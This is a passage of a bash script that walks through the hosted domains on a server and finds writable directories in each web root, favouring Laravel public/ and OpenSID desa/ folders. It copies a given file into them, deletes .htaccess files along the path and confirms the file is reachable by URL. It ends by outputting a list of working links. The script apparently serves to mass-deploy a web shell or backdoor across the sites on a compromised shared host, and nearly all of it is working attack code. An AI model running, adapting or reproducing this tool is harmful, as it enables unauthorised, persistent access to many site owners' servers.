  rm -f "$TARGETS_FILE" 2>/dev/null || true
  exit 1
fi

while IFS='|' read -r domain_name domain_user domain_dir domains_csv || [ -n "$domain_name" ]; do
  [ -n "$domain_name" ] || continue
  log "--- user=$domain_user domain=$domain_name ---"
  log "  domainDir: $domain_dir"
  if [ ! -d "$domain_dir" ]; then
    log "  SKIP: domainDir missing"
    continue
  fi

  # Reachability check for v1 + v3 (skip v2), same as manager.php
  if [ "$MODE" != "v2" ]; then
    case "$domain_name" in
      *.local) ;;
      *)
        code=$(http_status "https://$domain_name/")
        log "  https status: $code"
        if ! [ "$code" -ge 200 ] 2>/dev/null || [ "$code" -ge 500 ] 2>/dev/null; then
          code=$(http_status "http://$domain_name/")
          log "  http status: $code"
          if ! [ "$code" -ge 200 ] 2>/dev/null || [ "$code" -ge 500 ] 2>/dev/null; then
            log "  SKIP: domain not reachable"
            continue
          fi
        fi
        ;;
    esac
  fi

  laravel_public=$(laravel_public_dir "$domain_dir")
  desa_dir=$(opensid_desa_dir "$domain_dir")
  is_scoped=0
  scoped_label=""
  url_root=""

  if [ -n "$laravel_public" ]; then
    web_root="$laravel_public"
    url_root="$laravel_public"
    is_scoped=1
    scoped_label="public"
    log "  Laravel detected -> ONLY public/: $web_root"
  elif [ -n "$desa_dir" ]; then
    web_root="$desa_dir"
    url_root=$(dirname "$desa_dir")
    is_scoped=1
    scoped_label="desa"
    log "  OpenSID detected -> ONLY desa/: $web_root"
  else
    web_root=$(resolve_copy_webroot "$domain_dir" "$MODE")
    url_root="$web_root"
  fi
  log "  webRoot: $web_root"

  cand_file=$(mktemp 2>/dev/null) || cand_file="/tmp/.copy_sh_cand_$$"
  : > "$cand_file"

  if [ "$is_scoped" -eq 1 ]; then
    limit_n=12
    [ "$MODE" = "v2" ] && limit_n=6
    find_writable_dirs "$web_root" "$limit_n" 1 14 | filter_under_root "$web_root" > "$cand_file"
    if [ ! -s "$cand_file" ]; then
      find_writable_dirs "$web_root" "$limit_n" 0 6 | filter_under_root "$web_root" > "$cand_file"
    fi
    if [ ! -s "$cand_file" ] && [ -w "$web_root" ]; then
      printf '%s\n' "$web_root" > "$cand_file"
    fi
  elif [ "$MODE" = "v2" ]; then
    find_writable_dirs "$web_root" 12 2 5 > "$cand_file"
    if [ ! -s "$cand_file" ]; then
      log "  no deep writable (v2); fallback shallow"
      [ -w "$web_root" ] && printf '%s\n' "$web_root" >> "$cand_file"
      find_writable_dirs "$web_root" 8 0 5 >> "$cand_file"
    else
      [ -w "$web_root" ] && printf '%s\n' "$web_root" >> "$cand_file"
    fi
    awk 'NF && !seen[$0]++' "$cand_file" | head -n 12 > "${cand_file}.u" && mv "${cand_file}.u" "$cand_file"
  else
    find_writable_dirs "$web_root" 12 2 5 > "$cand_file"
    if [ ! -s "$cand_file" ]; then
      log "  no deep writable; fallback shallow"
      find_writable_dirs "$web_root" 6 0 5 > "$cand_file"
    fi
    awk 'NF && !seen[$0]++' "$cand_file" > "${cand_file}.u" && mv "${cand_file}.u" "$cand_file"
  fi

  wcand=$(wc -l < "$cand_file" | tr -d ' ')
  log "  writable: $wcand"
  while IFS= read -r c || [ -n "$c" ]; do
    [ -n "$c" ] && log "    - $c"
  done < "$cand_file"

  if [ ! -s "$cand_file" ]; then
    log "  SKIP: no writable${is_scoped:+ under $scoped_label/}"
    rm -f "$cand_file" 2>/dev/null || true
    continue
  fi

  while IFS= read -r target_dir || [ -n "$target_dir" ]; do
    [ -n "$target_dir" ] || continue
    if [ "$is_scoped" -eq 1 ]; then
      td=$(printf '%s' "$target_dir" | sed 's|/*$||')
      pr=$(printf '%s' "$web_root" | sed 's|/*$||')
      if [ "$td" != "$pr" ] && case "$td" in "$pr"/*) false ;; *) true ;; esac; then
        log "    SKIP outside $scoped_label/: $target_dir"
        continue
      fi
    fi

    dest="$target_dir/$FILENAME"
    method=$(smart_copy "$SRC" "$dest") || method=""
    if [ -z "$method" ]; then
      log "    SKIP: copy failed"
      continue
    fi
    log "    copied: $dest [$method]"

    ht_status=$(remove_path_htaccess_chain "$web_root" "$target_dir")
    log "    htaccess: $ht_status"

    path_ok=0
    if [ -f "$dest" ] && [ -s "$dest" ]; then path_ok=1; fi
    log "    check path: $([ "$path_ok" -eq 1 ] && echo OK || echo FAIL)"

    url=""
    url_ok=0
    url_status=0
    picked=""

    try_list=$(printf '%s\n%s' "$domain_name" "$(printf '%s' "$domains_csv" | tr ',' '\n')" | awk 'NF && !seen[$0]++')
    while IFS= read -r d_try || [ -n "$d_try" ]; do
      [ -n "$d_try" ] || continue
      case "$d_try" in *.local) continue ;; esac
      u_https=$(build_url https "$d_try" "$url_root" "$dest")
      st=$(http_status "$u_https")
      log "    check url https: $u_https => $st"
      if [ "$st" = "200" ]; then
        url="$u_https"; url_ok=1; url_status=200; picked="$d_try"
        break
      fi
      u_http=$(build_url http "$d_try" "$url_root" "$dest")
      st2=$(http_status "$u_http")
      log "    check url http: $u_http => $st2"
      if [ "$st2" = "200" ]; then
        url="$u_http"; url_ok=1; url_status=200; picked="$d_try"
        break
      fi
      if [ -z "$url" ]; then
        url="$u_https"; url_status="$st"; picked="$d_try"
      fi
    done <<EOF
$try_list
EOF

    [ -n "$picked" ] && domain_name="$picked"
    if [ -z "$url" ]; then
      url="$dest"
      log "    check url: skipped (.local / no FQDN)"
    fi

    if [ "$path_ok" -ne 1 ]; then
      log "    SKIP: path invalid after copy"
      continue
    fi

    CONFIRMED=$((CONFIRMED + 1))
    block=$(printf '%s. %s' "$CONFIRMED" "$url")
    RESULT_LINES+=("$block")
    log "    OK: $url"
    break
  done < "$cand_file"
  rm -f "$cand_file" "${cand_file}.u" 2>/dev/null || true
done < "$TARGETS_FILE"

rm -f "$TARGETS_FILE" 2>/dev/null || true

i=0
while [ $i -lt ${#RESULT_LINES[@]} ]; do
  printf '%s\n\n' "${RESULT_LINES[$i]}"
  i=$((i + 1))
done

if [ -n "$OUT_FILE" ]; then
  {
    i=0
    while [ $i -lt ${#RESULT_LINES[@]} ]; do
      printf '%s\n\n' "${RESULT_LINES[$i]}"
      i=$((i + 1))
    done
  } > "$OUT_FILE"
  echo "Saved: $OUT_FILE" >&2
fi

exit 0
